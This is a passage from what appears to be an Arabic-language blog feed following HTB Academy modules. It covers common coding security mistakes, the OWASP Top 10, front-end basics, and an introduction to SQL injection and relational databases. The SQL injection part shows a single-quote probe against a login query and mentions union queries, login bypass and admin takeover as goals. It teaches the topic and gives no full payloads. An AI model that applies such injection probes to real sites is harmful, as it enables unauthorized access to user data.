المبرمج مابيتحقق من صحة البيانات يلي بدخلها المستخدم (مثل الحقول في نموذج). مثلاً إذا أدخل المستخدم رمز ضار داخل حقل الاسم، هالشي ممكن يتسبب بهجمات مثل حقن SQL.2- التركيز على النظام ككل بدلاً من التفاصيلبركز بعض المبرمجين على الأداء العام للتطبيق بدون التحقق من أمان كل جزء (مثل التحقق من المدخلات أو تشفير البيانات). هالشي بيترك ثغرات داخل أجزاء صغيرة ممكن انها تُستغل.3- إنشاء طرق أمنية مخصصة غير موثوقةبدال ما يستخدم مكتبات أمنية موثوقة (مثل مكتبات التشفير القياسية)، بعض المبرمجين بيتذاكوا وبحاولوا يعملو حلول أمنية خاصة فيهم، وهي غالبًا ضعيفة وسهلة الاختراق.4- تأخير الاهتمام بالأمان إلى المرحلة الأخيرة بعض المبرمجين بيهملوا الأمان في بداية التطوير وبيتركوه للأخير، وهالشي بخلي إصلاح الثغرات اصعب واغلى.5- تخزين كلمات المرور كنصوص عاديةإذا خُزّنت كلمات المرور دون تشفير، يمكن للمهاجمين الوصول إليها بسهولة إذا تم اختراق قاعدة البيانات.6- إنشاء كلمات مرور ضعيفةتخيل عم تستخدم لسا كلمات سر متل اسمك واسم الكراش🤦‍♂️، أو إذا مافي فرض قواعد صارمة لكلمات المرور ممكن يخلي الحسابات عرضة للهجمات.7- تخزين بيانات غير مشفرة في قاعدة البياناتمثل كلمات المرور، إذا خُزّنت بيانات حساسة (مثل أرقام البطاقات البنكية) بدون تشفير، يمكن سرقتها بسهولة.8- الاعتماد المفرط على جانب العميلالاعتماد على JavaScript في المتصفح للتحقق من البيانات (مثل التحقق من صحة النموذج) بدون التحقق بال Server بيسمح للمهاجمين بتجاوز هذه القيود.9- التفاؤل الزائد بشأن الأمانبعض المبرمجين بيتجدعنو وبيفترضوا انو مافي التطبيق آمن ومو بحاجة اختبار🌚.  10- السماح بتمرير المتغيرات عبر مسار URLإذا تمررت بيانات حساسة (مثل ال user-id) عبر عنوان URL دون تشفير، يمكن للمهاجمين التلاعب بها.11- الثقة المفرطة في الكود الخارجياستخدام مكتبات أو أكواد من مصادر غير موثوقة ممكن يسبب إدخال ثغرات أمنية.12- تضمين حسابات خلفية (Backdoor Accounts) مشفرة بشكل ثابتإضافة حسابات إدارية مخفية في الكود مع كلمات مرور ثابتة يسهل على المهاجمين اكتشافها.13- عدم التحقق من هجمات حقن SQLإذا ما نظفت مدخلات المستخدم ممكن يسمح للمهاجمين بحقن أوامر SQL للوصول إلى بيانات قاعدة البيانات.14- تضمين ملفات عن بُعد (Remote File Inclusions)السماح للتطبيق بتحميل ملفات من مصادر خارجية دون التحقق منها ممكن يسبب تنفيذ كود ضار.15- التعامل غير الآمن مع البياناتنقل البيانات الحساسة دون تشفير (مثل عبر HTTP بدلاً من HTTPS) يعرضها للاختراق.16- فشل في تشفير البيانات بشكل صحيحإذا استخدمت خوارزميات تشفير ضعيفة أو قديمة بخلي البيانات عرضة للكسر.17- عدم استخدام نظام تشفير آمنتجاهل معايير التشفير الحديثة (مثل AES أو RSA) يعرض البيانات للخطر.18- تجاهل الطبقة الثامنة (Layer 8)الطبقة الثامنة تشير إلى العامل البشري (مثل أخطاء المستخدمين أو المطورين). تجاهل تدريب المستخدمين أو المطورين بيرفع من المخاطر.19- عدم مراجعة تصرفات المستخدمينعدم مراقبة أو تسجيل أنشطة المستخدمين يجعل من الصعب اكتشاف الهجمات أو السلوكيات الضارة.20- إعدادات خاطئة لجدار الحماية لتطبيقات الويب (WAF)إعداد جدار حماية التطبيق بشكل غير صحيح قد يسمح بمرور الهجمات التي كان من المفترض منعه.وهلق رح نحكي عن اشهر 10 ثغرات بعالم تطبيقات الويب ورح ضيف شرح بسيط على كل وحدة منهم بس رح يكون لكل ثغرة درس لحال:1- Broken Access Control  : لما المستخدمين بيقدروا يوصلوا لبيانات او وظائف ما عندهن الصلاحية من انهن يوصلولها متل عرض ملف شخصي لمستخدم تاني بتغيير ال user-id من ال URL.2- Cryptographic Failures  : سرقة البيانات بسبب عدم استخدام تشفير قوي لحماية البيانات الحساسة(متل كلمات السر او بيانات العملاء)3- Injection  : بيسمح هاد النوع من الثغرات للمهاجمين بإضافة اكواد واوامر داخل التطبيق (متل اوامر SQL) وهالشي بيسمح للمهاجم بسرقة وتسريب البيانات الحساسة.4- Insecure Design  : لما المبرمج بيترك الأمان وبيعتبره شي ثانوي.5- Security Misconfiguration  : ترك الإعدادات الافتراضي وكلمات السر الإفتراضية أو ترك البرمجيات قديمة.6- Vulnerable and Outdated Components  : استخدام برمجيات او مكتبات قديمة ممكن يكون فيها ثغرات امنية.7- Identification and Authentication Failures  : متل السماح بإنشاء حسابات بكلمات السر الضعيفة او عدم استخدام المصادقة المتعددة.8- Software and Data Integrity Failures  : عدم التحقق من سلامة البيانات أو البرمجيات (مثل تحديثات غير موثوقة) قد يؤدي إلى إدخال كود ضار.9- Security Logging and Monitoring Failures  : اذا ما سجلت الأنشطة المشبوهة أو مراقبتها هالشي بيترك اكتشاف الهجمات صعبًا.10- Server-Side Request Forgery - SSRF  : بيسمح للمهاجمين بإجبار ال Server على إرسال طلبات لمواقع غير مصرح بها، وهالشي ممكن يكشف بيانات حساسة.Front End Components📌 HTML:HTML(HyperText Markup Language) هي المكون الأساسي والأكثر أهمية بال Front end، وهي الطبقة الأساسية لأي Web Application ممكن نشوفه على الانترنت، وبتحدد ال HTML، الاساسيات العامة للصفحة متل العناوين (Titles) والصور (Images) والفقرات (Paragraphs) وكل العناصر الأساسية لتشكيل الصفحة.لما تتحمل صفحة الويب، المتصفح متل Firefox بفسر هي العناصر وبحولها لمحتوى مرئي للمستخدم النهائي.مثال لصفحة HTML:هي كود بسيط بيشرح كيف بتشتغل لغة ال HTML:&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Page Title&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;A Heading&lt;/h1&gt;        &lt;p&gt;A Paragraph&lt;/p&gt;    &lt;/body&gt;&lt;/html&gt;الشي يلي بيظهر على المتصفح:  ⚪ HTML Structureبتتنظم عناصر HTML على شكل شجرة (Tree Structure)، بطريقة مشابهة للغات أخرى مثل XML. هذه الشجرة تبدأ من العنصر الجذر (document)، وتتفرع كما يلي:document - html   -- head      --- title   -- body      --- h1      --- pdocument:  هو الجذر يلي بيحتوي على كامل الصفحة.html:  العنصر الرئيسي يلي بيحتوي على كل عناصر الصفحة.head:  يحتوي على عناصر غير مرئية مباشرة على الصفحة، مثل عنوان الصفحة (title).body:  يحتوي على العناصر المرئية، متل العناوين (h1) والفقرات (p).كل عنصر في HTML يمكن أن يحتوي على عناصر أخرى داخلية، لكن العنصر html هو العنصر الأساسي الذي يضم جميع العناصر الأخرى في الصفحة. وهيك بقدر ميز مستندات HTML عن مستندات لغات تانية مثل XML.  كل عنصر بلغة HTML بيتعرف عن طريق وسم (Tag) ليحدد نوعه. مثلاً:عندي وسم _p_ بيستخدم للفقرات، بيبدأ العنصر بوسم _p_ وبتنتهي بإغلاقه _/p_ والمحتوى بكون بين الوسمين&lt;p&gt;Hack With Farouk&lt;/p&gt;وممكن ضيف id او class للtag لحدد العنصر اكتر، متل:&lt;p id=\"para1\"&gt;One&lt;/p&gt;&lt;p class=\"para2\"&gt;Two&lt;/p&gt;⚪ URL Encoding URL Encoding   أو (Percent-Encoding)   هو عبارة عن تحويل الأحرف الغير آمنة بال URLs لتنسيق ممكن المتصفحات انو تفهمه. المتصفحات بتستخدم ترميز ASCII ، وهاد الترميز ما بيحتوي غير على الأحرف الأبجدية والأرقام (Alphanumeric)  وشوية رموز. وأي محارف تانيةلازم تترمز باستخدام رمز النسبة المئوية (%) متبوعًا برقمين سداسي عشري (Hexadecimal). المتصفح بحاجة انو يعرف مجموعة المحارف المستخدمة حتى يقدر يعرضها مزبوط وبعض المحارف متل المسافات او الرموز مابيقدر المتصفح انو يفهمها لهيك بتتحول لتنسيق آمن ومفهوم. على سبيل المثال ال single-quote character ( ' ) بيتحول ل 27% حتى يكون مفهوم بال URLs، وهي قائمة ببعض الرموز يلي بيتم تحويلها:            Character      Encoding                  space      %20              !      %21              ”      %22              #      %23              $      %24              %      %25              &amp;      %26              ’      %27              (      %28              )      %29      في كتير ادوات لعمل ال Encoding وال Decoding لل URLs متل اداة ال Burb Suite  وادوات اونلاين متل: URL-Encoderفوت وجرب تعمل Encoding  لكلمة Hello World مثلاً وشوف شو بتصير وشو بيتغير فيها...⚪ DOMخلينا نقول انو اهو عبارة عن خريطة يلي بتعمل هيكلية صفحة ال HTML، او فينا نقول بشكل ادق هو الطريقة يلي بشوف فيها المتصفح صفحة ال HTML.وبتنقسم ال DOM ل 3 أنواع:1- Core DOM:   لجميع انواع المستندات.2- XML DOM:   لمستندات ال XML.3- HTML DOM:   لمستندات ال HTML (وهي يلي بتهمنا).باستخدام ال DOM بتقدر تشير للعناصر متل document.head او document.body.h1 يعني متل ما بتشير لأي ملف بجهازك.طيب سؤال الك🌚 اذا بدنا نغير لون عنوان &lt;h1&gt; باستخدام JavaScript، شو بتتوقع منكتب جوا الكود؟🌚فكر باسم العنصر باستخدام DOM مابتهم طريقة الاستدعاء حالياً.ال HTML فيني قسمها بشكل اساسي لقسمين:1- الـ &lt;head&gt;:هنا بتحط حاجات متل عنوان الصفحة (&lt;title&gt;)، روابط CSS (&lt;link&gt;)، أو كود JavaScript (&lt;script&gt;). يعني متل الكواليس ورا المسرح.2- الـ &lt;body&gt;:هون المحتوى يلي بتشوفه بالصفحة، متل العناوين (&lt;h1&gt;) والفقرات (&lt;p&gt;) وحتى الصور (&lt;img&gt;)كل عنصر في الصفحة هو جزء من الـ DOM، وتقدر توصل له باستخدام الـ id أو class أو اسم الtag. ,وهالشي مفيد لو بدك تصلح مشكلة في الصفحة أو حتى تستغل ثغرة أمنية متل XSS (بس خلينا في الخير حالياً ورح نوصللها قريباً 😜).طيب لو ياترى شفت صفحة ويب فيها مشكلة انو في فقرة ماعم تظهر ياترى المشكلة بتكون بال &lt;head&gt; ولا بال &lt;body&gt;  HTB Questions: What is the HTML tag used to show an image?   Answer: &lt;img&gt;📌 Cascading Style Sheets (CSS)تخيّل ال HTML عبارة عن الهيكل العظمي لصفحة الويب، متل البيت اللي بنيته بالطوب. هون بتجي ال، CSS متل اللي بييجي يدهن الجدران، يحط الستاير، يختار الألوان، ويخلي البيت حلو ومرتبيعني ال CSS هي اللغة يلي منستخدمها مشان نتحكم بشكل وتنسيق عناصر ال HTML من الألوان والخطوط والحجم ومكان العناصر بالصفحة وحتى الحركات وال Animation.مثال بسيط:body {  background-color: black;}h1 {  color: white;  text-align: center;}p {  font-family: helvetica;  font-size: 10px;}اول شي ال body:وهو يلي بيتحكم بهيكل الصفحة كلها، وهون حطينا الخلفية تكون باللون الأسود.بعدين عنا ال h1:وهون حطينا لون جميع العناوين بالأبيض ومكانها بمنتصف الشاشة. اول شي ال p:وهون خلينا كل الفقرات مكتوبة بخط Helvetica وبحجم 10px.لو جربنا هاد الكود بصفحة ال HTML يلي عملناها قبل شوي رح تطلع احلى بكتير، بس بعرفك اكيد تكاسلت وماجربت ال HTML🌚يلا يا كسلان فوت جربهن بأيدك وجرب عدل عال css وشوف شو بصير😁⚫ Syntaxبتتذكر بال css نحنا وعم نحكي عن ال tags قلنا انو منقدر نحطلهن id , class يعني مثلا &lt;p id=\"para1\"&gt; ، ال CSS هو يلي بيستفيد من هالحركة بهالطريقة:#para1 {  color: blue;}هون بقول لل CSS لو لقيت Paragraph ال id الخاص فيه para1 خلي الخط فيه ازرق، وهالشي مشان ما نفذ امر واحد لكل ال paragraphs.ابحث عالنت كيف بتقدر تحدد اوامر بناء على ال Class مو ال id، واذا عندي فقرة ال id تبعها para1 وفقرة تانية ال class تبعها para2 كيف منقدر نخلي الاولى باللون الازرق والثانية بالاخضر، فكر لحالك لا تسأل Chatgpt شايفك🌚 CSS بتنكتب بطريقة سهلة ومنظمة وكل قاعدة بتكون بهالشكل:h1 {  color: white;  text-align: center;}هون منلون كل عنصر h1 باللون الأبيض ومنخليه يتوسط الصفحة.وفي كتير properties ممكن استخدمها بال css رح احكي عن بعض منها:- color: لون النص.- background-color: لون الخلفية.- font-size: حجم الخط.- margin: المسافة الخارجية حول العنصر.- padding: المسافة الداخلية داخل العنصر.- border: الحدود حول العنصر.وكل خاصية في الها قيم معينة، متل الألوان (red, #FF0000) أو الأحجام (10px, 2em) أو كلمات مفتاحية (center, bold).ابحث عالنت كيف منقدر نخلي فقرة عندها حدود سوداء ومسافة داخلية 5 بكسل، وشو الخصائص اللي لازم تستخدمها؟ مامنستخدم ال CSS للألوان والتنسيق فقط، منقدر نستخدمها مشان نخلي الموقع يرقص💃🏻بتقدر تعمل حركات متل تغيير اللون بشكل تدريجي او تحرك العناصر او حتى تعمل رسومات 3D.,مثال بسيط: @keyframes slide {  from { left: 0; }  to { left: 100px; }}div {  animation: slide 2s infinite;}هون منقول للعنصر div يتحرك من اليسار لليمين 100 بيكسل بثانيتين، وخليك عم تكرر الحركة للأبد، يعني مافي اسهل من هيك كأنك عم تدرب روبوت عالرقص😂💃🏻⚫ Usageبيشتغل متل سوبرمان مع ال HTML وال JavaScript:- JavaScript: بتقدر تغير أنماط العناصر بناء على تصرف المستخد، متل انك تضغط على زر فيتغير فيتغير لون الخلفية.- HTML: بيخلي الصفحة تطلع أنيقة ومرتبة بدل ما تكون مجرد نصوص مملة.- تطبيقات الموبايل: CSS بيستخدم بتصميم واجهات المستخدم (UI) لتطبيقات الموبايل.- مع XML أو SVG: ممكن تستخدم CSS لتنسق عناصر متل الصور المتجهة.⚫ Frameworksكتابة قواعد لكل Element ممكن يكون متعب وخاصة لو عم تشتغل على Project كبير لهيك في شي اسمه Frameworks وهي قوالب جاهزة مليانة تصاميم حتى توفر عليك وقت وجهد وتخلي الصفحة احترافية بشكل اسرع.أشهر أطر العمل:- Bootstrap: متل السوبرمان بتاع CSS، فيه كلشي  جاهز من أزرار لجداول.- SASS: نسخة \"مطورة\" من CSS، بتخليك تكتب كود أقل وأذكى.- Foundation: متل Bootstrap بس أخف ومرن أكثر..- Bulma: خفيف وسهل، مثالي للمشاريع الصغيرة.- Pure: بسيط وخفيف جدًا، للي بدهم شي minimal.الإطارات هي بتيجي مع قوالب جاهزة، متل أزرار، قوائم، أو حتى تصاميم كاملة لصفحات، وبتشتغل حلو مع JavaScript.📌 JavaScriptحكينا قبل انو ال HTML هو الهيكل العظمي تبع صفحة الويب وال CSS هو الديكور والألوان يلي بتعطي جمالية للصفحة، اما ال JavaScript فهو العقل يلي بتخلي الصفحة تعيش وتتفاعل مع المستخدم.ال JavaScript هي لغة من اشهر لغات البرمجة بالعالم ومنستخدمها بشكل اساسي لتطوير تطبيقات الويب، غالباً بتشتغل ال JavaScript بال Front End يعني بالمتصفح تبعك، بس كمان ممكن انها تستخدم بال Back End متل لما نستخدمها مع ال Node.js. حرفيا بدون ال JavaScript صفحات الويب رح تكون متل لوحة قديمة، حلوة بس مافيها حياة، ومستحيل تتفاعل معك، اما باستخدام ال JavaScript بتخلي الصفحة تتفاعل معك يعني متل لما تضغط زر يتنفذ امر معين، او لما يتحدث المحتوى بالوقت الفعلي يعني متل تحديثات ال Timeline بالتويتر (X🌚).وفي طريقتين لكتابة كود JavaScript:1- كتابة كود داخل صفحة ال HTML:&lt;script type=\"text/javascript\"&gt;    document.getElementById(\"button1\").innerHTML = \"نص جديد!\";&lt;/script&gt;2- او ربط ملف JavaScript خارجي:&lt;script src=\"./script.js\"&gt;&lt;/script&gt;مثال عملي:مافي داعي تفهم المثال كتير، بس المهم تفهم شو بتعمل ال JavaScript ومع الوقت رح تفهم اللغة اكتر🌚&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;JavaScript&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;button id=\"button1\"&gt;Click Here&lt;/button&gt;    &lt;script type=\"text/javascript\"&gt;        document.getElementById(\"button1\").onclick = function() {            document.getElementById(\"button1\").innerHTML = \"Contant Changed!\";        };    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;    لنفرض عندي هي صفحة ال HTML، فيها زر ال id = button1 ، الكود بقول لما تضغط على هاد الزر غير النص داخله ل Contant Changed!، وفي كتير مواقع ممكن تجرب فيهن استخدام ال JavaScript متل موقعjsfiddleيلي بيسمحلك تكتب html, css, javascript، وتشوف الناتج.🟡 Usageبتشتغل ال JavaScript جوا المتصفح بفضل محرك داخل المتصفحات وهو متل شيف بيطبخ الكود وبحوله لتعليمات تتنفذ عجهازك مباشرة بدون ما تحتاج ترجع للسيرفر، وهاد الشي بخلي ال JavaScript سريعة جدا لأن كلشي بصير على جهازك، يعني متل لما تحط Like لحدا على الانستغرام فهو يلي بحول القلب للون الأحمر🌚❤️او حتى لما تشوف كيف اللايكات عم تزيد بدون ما تحتاج تعيد تحميل الصفحة🟡 Frameworksمتل ماحكينا بال CSS هي عبارة عن ادوات فيها اكواد ومكاتب جاهزة حتى توفر وقت وجهد وبتساعد تبني التطبيق بسرعة، ومن اشهر ال Frameworks الخاصة بال JavaScript:- React: سريع ومرن، وبيستخدمه ناس كتير متل فيسبوك.- Angular: لتبني تطبيقات كبيرة بطريقة منظمة.- Vue: خفيف وحلو، مثالي للمشاريع اللي عايزة شي بسيط بس قوي.- jQuery: الأخ الأكبر، كان مشهور زمان ومازال مفيد لأشياء بسيطة.كل إطار عمل عنده مميزات خاصة، وتقدر تشوف المقارنة بينهم:wikipediaFront End Vulnerabilities"
  },
  
  {
    "title": "SQL Injection Fundamentals — Arabic HackThe Box ACADEMY Walkthrough",
    "url": "/posts/SQLfundemantle/",
    "categories": "Hack_The_Box_Academy",
    "tags": "SQL, PenetrationTesting, Security, Hacker",
    "date": "2025-05-14 00:00:00 +0300",
    





    
    "snippet": "  HTB Academy الدرس على مرحبا يا هكرجية👨🏻‍💻، انا فاروق واليوم رح نحكي ثغرة ال SQL Injection ورح نشرح كلشي بال Module من HTB. الفكرة انو هالشي عم ياخد وقت وجهد كبير بس انا ماشي على مبدئ زكاة العلم ن...",
    "content": "  HTB Academy الدرس على مرحبا يا هكرجية👨🏻‍💻، انا فاروق واليوم رح نحكي ثغرة ال SQL Injection ورح نشرح كلشي بال Module من HTB. الفكرة انو هالشي عم ياخد وقت وجهد كبير بس انا ماشي على مبدئ زكاة العلم نشره وعسى يكون صدقة جارية لأهلي لهيك بس يلي رح اطلبه منك تتذكرنا بدعوة من قلبك وكمان تنشر العلم مع اي حدا مهتم بالمجال وبالتوفيق يارب❤️. إن اخطأت فمن الشيطان ومن نفسي وإن اصبت فمن الله✨Table of Contents📌 Introduction:    اغلب تطبيقات الويب الحديثة بتعتمد على قاعدة بيانات (Database) بال Backend، بتستخدم هال Databases لتخزين واسترجاع البيانات المتعلقة بال Web Application، بداية من محتوى ال Website وبياناته الاساسية وصولا للبيانات الخاصة بالمستخدمين ومحتواهم على الموقع.    يعني مثلاً الانستغرام، كل المنشورات والصور والحسابات الشخصية والريلز مخزنة ضمن Databases ضخمة جدا.    وحتى اقدر خلي ال Web Application يكون dynamic لازم خليه يتواصل مع قاعدة البيانات.    يعني لما بيوصلني طلب HTTP/s Request من اليوزر، لازم ال Backend تبع الموقع تبعت طلب لل Database حتى يصير في استجابة.    هاد الطلب يلي بيبعته ال Web Application بسميه query وهال query بتحتوي معلومات من الطلب يلي وصلها وبعض المعلومات التانية يلي رح نشرحها بالتفصيل.    يعني مثلاً اذا عندي قاعدة بيانات لشركة وبدي اسماء كل الموظفين فبتكون ال query بالشكل التالي:Select * FROM employees;    ✅ ملاحظة:   طبيعي اذا مافهمت شي لسا رح نشرح التعليمات كلها بالتفصيل😅  الفكرة هون انو اذا بستخدم المعلومات يلي بيعطيني ياها المستخدم حتى ابني query لقاعدة البيانات تبعي رح يصير عندي كتير مشاكل، لانو ممكن الهكر بكل بساطة يستخدم هي ال query ويعدل شوي عليها ليستخدمها بشي تاني تماما او ليحاول يوصل لقواعد بيانات ما لازم يكون عنده وصول عليها وهاد الشي اسمه هجوم ال SQL Injection.يعني اتخيل معي اي شي بيعطيني ياه المستخدم بروح بحطه بال query تبعي بدون ما اتأكد منه، بقوم الهاكر بضيف اوامر جديدة عال query متل انه يعرض اسماء وكلمات السر تبع كل المستخدمين 🫠 ولقدام شوي رح نشوف كيف ممكن نعمل هالشي بأيدنا😈المقصود بمصطلح الSQL Injection هو الهجوم على relashional database، بينما في هجمات على ال non-relational dataabase متل MongoDB.وبهي الوحدة رح نركز على ال MySQL حتى نقدر نفهم مفاهيم ال SQL Injection، وإن شاء الله لاحقاً منشرح عن ال non-relational database.🔵 SQL Injection (SQLi):      في عندي كتير انواع من ثغرات ال Injection بتطبيقات الويب مثل:       HTTP Injection, Code Injection, Command Injection بس اشهر الشي عندي هو ال SQL Injection.      بصير عندي ال SQL Injection لما المستخدم بحط مدخلات بتغير بال query يلي بدو يبعتها الويب لقاعدة البيانات وهالشي بخلي المستخدم ينفذ quries غير يلي لازم تتنفذ متل ماشرحنا سابقاً اذا شخص غير بال query وعرض يوزرات وكلمات سر كل المستخدمين.      حتى نفذ ال SQL Injection، لازم اول شي حاول ادخل مدخلات SQL حتى غير بالمنطق تبع ال query وما يتم تنفيذ مجرد ال query يلي بدو ال Web Application ينفذها.      وحدة من الطرق البسيطة هي ادخال single quote (‘) أو double quote (“)، وهالشي عشان اتأكد اذا عم يتم تنفيذ اي شي بدخله بال query مباشرة ولا عم يتم تنظيفه.      مثال:      خلينا نتخيل انو عندي صفحة تسجيل دخول عادية، لما الشخص يدخل الاسم وكلمة السر بصير هيك عندي بال Backend:          SELECT * FROM users WHERE username = 'username' AND password = 'password';      ولما الشخص يدخل ( ' ) بدال الاسم فبصير عندي هيك اذا بحط المدخلات مباشرة بال query          SELECT * FROM users WHERE username = ''' AND password = 'password';      وهاد الشي برجع Error وهيك بعرف انه الموقع ما براقب المدخلات قبل ما يضيفها عال query            وبمجرد ما شوف انو طلع عندي Error ساعتها بحاول وسع الهجوم تبعي وادخل اوامر تانية لنفذ الامر الاساسي يلي كان موجود بالإضافة للأوامر الجديدة يلي بدي ياها.      وهالشي ممكن باستخدام شي اسمو stacked queries او using Union queries رح نحكي عنهن بشكل اوسع لاحقاً ، وبالنهاية حتى اقدر جيب المعلومات من هالاستعلام وشوفها لازم استدعيها بال Frontend مثلا.    ✅ ملاحظة: لحد الآن عم نحكي بالمقدمة ونشرح ال Methodology بشكل عام ولقدام رح نشوف كيف منطبق كل خطوة مع امثلة. 🔵 Use Cases and Impact:      ممكن يكون تأثير ال SQL Injection كارثي وخاصة اذا كانت الصلاحيات على ال Backend وعلى ال Database ضعيفة.      ممكن الهكر يوصل لمعلومات سرية ما لازم حدا يقدر يوصلها، متل بيانات تسجيل الدخول تبع المستخدمين وكلمات السر الخاصة فيهن أو حتى معلومات البطاقات البنكية.      في عندي استخدامات تانية لل SQL Injection، متل اني اقدر سجل دخول لحساب محدد بدون ما استخدم كلمة السر🌚، وممكن كمان اقدر وصل لحساب الادمن تبع الموقع وعدل بالبيانات الموجودة على كيفي وضيف اكواد على ال Backend وأعمل ثغرات جديدة بال Backend بتسمحلي اني اتحكم بالموقع بالكامل، بس طبعا ما رح نعمل هيك لانو نحنا اكابر😈🔵 Prevention:      غالبا بكون سبب ال SQL Injection هو اغلاط برمجية او مشاكل بالصلاحيات على ال Database، ورح نحكي لقدام شو هي اهم الطرق يلي بتقلل من احتمالية التعرض ل SQL Injection باستخدام طرق التشفير والتحقق من المدخلات وصلاحيات المستخدم بال Backend.وهيك منكون خلصنا المقدمة واتعلمنا شوي عن قواعد البيانات بشكل عام واخدنا لمحة بسيطة عن ال SQL Injection، وإن شاء الله رح نتوسع اكتر ورح نبلش ندخل ونفهم قواعد البيانات بشكل اكبر.كملو يا وحوش🔥✨Databases📌 Intro to Databases    قبل ما نتعلم ال Sql Injection بدنا نتعلم شوي عن ال SQL، يعني اكيد حتى نقدر نعدل على الquery لازم نعرف عالقليلة نقرأها ونفهمها صح🌚    في انواع كتيرة ومتنوعة من قواعد البيانات ولكل نوع استخدام غير التاني، كانت التطبيقات سابقاً بتستخدم قواعد بيانات بتخزن ال Data بملفات وهاد الشي كان بطيء كتير وخاصة لما يصير عندي كمية كبيرة من الData وهاد الشي يلي جعل الكل يعتمد على ال Database Managment System(DBMS).🟢 Database Management Systems:    ال Database Managment System(DBMS) هو عبارة عن نظام بساعدني على إنشاء قواعد البيانات وتعريفها وحتى إستضافتها كمان.    وموجود اكتر من نوع لل DBMS متل ال RDBMS وانظمة ال NoSQL وانظمة قائمة على الرسوم البيانية.    وفي اكتر من طريقة للتعامل مع ال DBMS متل سطر الاوامر(Terminal) أو الواجهات الرسومية أو حتى ال APIs.    ورح نتعامل معه كتير لاحقاً، ونفهمه بشكل اعمق.      المقصود من الجدول انو ال DBMS عنده كتير خصائص منها: Concurrency ومعناها انو لما اكتر من شخص ينفذ اوامر على قعادة البيانات بنفس الوقت، بتضمن ال DBMS انو يتنفذ هاد الشي بدون ما تتخربط البيانات او يصير عندي خسارة الها.    Consistency    ومقصود فيها انو ال DBMS بيتأكد من البيانات انو تكون صالحة ومتسقة بكل قاعدة البيانات.     Security     بيتأكد أنو عندي ضوابط امنية من خلال التأكد من صلاحيات المستخدم والعديد من الأمور.     Reliability    بيسمحلك تعمل نسخة من قاعدة البيانات وترجعلها دائما اذا صار اختراق الله لايقدر او فقدت بياناتك.    Structured Query Language    ال SQL بيجعل التفاعل ابسط بين المستخدم وال Database.🟢 Architecture    بتوضحلي هالصورة انو عندي بنيتين بالموقع:      البنية الأولى:    اسمها ال Frontend بتتكون عادة من الجانب الخاص بالمستخدم، متل مواقع الويب والواجهات الرسومية او حتى الصور والألوان، يعني حرفيا كلشي بشوفه المستخدم، وبتكون غالباً تفاعلية يعني فيها صفحة تسجيل دخول ومكان للتعليقات، والبيانات يلي مندخلها بتنتقل للبنية التانية عن طريق شي اسمو API أو Requests.    البنية الثانية:    اسمها ال Backend، وهي المسؤولة عن تفسير البيانات يلي بتجيني من الطبقة الاولى وتجهيزها بالشكل يلي بيقبله ال DBMS، وبتستخدم هالطبقة مكتبات وبرامج حسب نوع ال DBMS يلي عم تتعامل معو.    بعدين بيستلم ال DBMS الأوامر من الطبقة الثانية وبينفذ الأوامر المطلوبة متل ادخال بيانات او تعديل بيانات او حتى حذف بيانات.    وبرجع ال DBMS البيانات المطلوبة او الاخطاء يلي بتطلع عندي اذا كان في queries غير صحيحة.  💡 يعني حرفياً ال Frontend هو المكان يلي بيتعامل معه المستخدم ولما بيختار شي بحاجة التعامل مع قاعدة البيانات بتم ارسال هالشي لل Backend وهون بيتحول الطلب ل query بيفهمها ال DBMS، بعدين بيرجع الرد من ال DBMS لل Frontend مشان يتم عرضه للمستخدم.    ✅ ملاحظة: ممكن اني ضيف ال Web Application وال DBMS على نفس السيرفر بس عادة بتنحط ال Database يلي فيها كمية كبيرة من المعلومات وفيها مستخدمين كتير على سيرفر لحال مشان يكون عندي قابلية لزيادة سعتها وتعطيني اداء افضل.📌 Types of Databases    حكينا سابقا انو عنا نوعين اساسيين لل Databases، ال    Relational Databases وال    Non-Relational Databases،     بالنسبة لل Relational Databases فهي بتستخدم لغة SQL فقط اما ال Non-Relational Databases فبتستخدم كذا طريقة للتواصل.    وهلق رح نحكي عنهن اكتر ونعرف الفروقات بيناتهم.🟣 Relational Databases:    ال Relational Databases هي النوع المنتشر والمتداول اكتر، بتستخدم شي اسمو Schema وهي متل قالب بحدد شكل البيانات جوا قاعدة البيانات.    خلينا نتخيل الموضوع متل شركة بتبيع منتجات، فمشان تنظم معلوماتها رح تكون بحاجة لمعلومات من الزباين متل: مين الزبون وشو المنتجات يلي اشتراها وقديش دفع...    فال Schema هون بتكون متل الخريطة يلي بتنظم كل هالمعلومات جوا جداول، يعني رح يكون عندي جدول للزباين وجدول للمنتجات يلي بتبيعهن الشركة ورح يكون فيه اسم المنتج وعدد القطع الموجودة ورح يكون في جدول للمشتريات موجود فيه مين الزبون يلي اشترى وقديش دفع وكيف دفع والخ...    وهالصورة بتوضح الجداول، عندي مثلا جدول اسمه Customer، بداخله اعمدة متل CustomerID ونوعه Integer, FirstName ونوعه String...          رح نحكي اكتر كيف نقرأ هيك جداول وكيف نصممها بأيدنا، بس هاد مثال عن البيانات كيف بتتخزن مو اكتر.    بترتبط الجداول ببعضها عن طريق شي اسمو Keys بتساعدني اني اوصل بسرعة للبيانات او بتعطيني ملخص عنها، وكل جدول فيه Key متل رقم تعريفي بيربطه بجدول تاني.    مثلا جدول الزباين فيه اعمدة متل CustomerID(رقم تعريفي لكل زبون), FirstName, Address... وجدول المنتجات فيه اعمدة متل ProductID(رقم تعريفي لكل منتج), ProdactName, Price...    هلق لما بجي بدي اعمل جدول ال Orders بكفي حط فيه ال CustomerID وال ProductID وال Quantity ويلي هي الكمية، وهو من جدول ال Customers بجيب كل تفاصيل الزبون ومن جدول ال Products بجيب كل تفاصيل المنتج.    ومشان نربط هدول الجداول مع بعض منستخدم Relational Database Management System ( RDBMS )    وهو مفهوم بيطبق من انواع كبيرة من قواعد البيانات متل MySQL, PostgreSQL, Microsoft Access وهالشي بساعدني اربط الجداول ببعض من خلال ال Keys بسهولة، والشركات صارت تحب تستخدم ال RDBMS لانه سهل الواحد يتعلمه ويستخدمه.  مثال عملي:    عندي جدول اسمه     Users فيه اعمدة متل:    id,    username,     firstname,     lastname.    وجدول ال    Posts فيه منشورات المستخدمين مع التاريخ وفيه عمود اسمه user_id موجود فيه رقم ال id للمستخدم مع ال Post تبعه.    وهيك اذا بدنا نجيب  كل المنشورات لمستخدم معين منربط ال id تبع المستخدم مع 